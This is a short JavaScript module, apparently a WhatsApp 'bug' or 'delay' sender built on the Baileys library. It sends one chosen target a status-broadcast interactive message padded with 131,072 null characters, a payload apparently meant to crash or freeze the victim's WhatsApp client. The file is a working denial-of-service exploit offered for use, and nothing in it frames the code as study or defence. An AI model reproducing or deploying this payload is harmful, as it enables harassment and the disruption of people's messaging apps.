const {
  generateWAMessageFromContent
} = require("baileys");

const { client } = require("../index.js");

async function native(target) {
  try {
    const msg = await generateWAMessageFromContent(
      "status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: "𝐗𝐯𝐥𝐨𝐯𝐞𝐫𝐬",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "𝐗𝐥𝐨𝐯𝐞𝐫𝐬",
            paramsJson: "\u0000".repeat(131072),
            version: 3
          }
        }
      },
      {}
    );

    await client.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target] // 👈 TARGET YAHAN
      }
    );

    console.log("✅ Delay sent via STATUS to", target);

  } catch (err) {
    console.error("❌ Delay error:", err);
  }
}

module.exports = { native };
